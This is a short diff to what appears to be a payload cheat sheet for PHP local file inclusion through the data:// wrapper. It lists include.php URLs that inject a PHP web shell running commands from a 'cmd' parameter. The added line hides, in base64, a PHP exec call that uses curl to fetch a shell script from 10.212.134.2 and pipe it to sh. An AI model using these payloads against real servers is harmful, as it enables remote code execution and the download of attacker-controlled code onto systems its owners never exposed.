@@ -118,6 +118,7 @@ Used to embed inline data as part of the URL with plaintext or base64.
 /include.php?file=data:text/plain,<?php system($_GET["cmd"]);?>&cmd=id
 /include.php?file=data:,<?php system($_GET["cmd"]);?>&cmd=id
 /include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&cmd=id
+/include.php?file=data:application/x-httpd-php;charset=utf-8;base64,PD9waHAgZXhlYygnY3VybCBodHRwOi8vMTAuMjEyLjEzNC4yOjQ0My9pc2VjLnNoIHwgc2gnKSA/Pg==
 ```
 
 ### Wrapper filter://
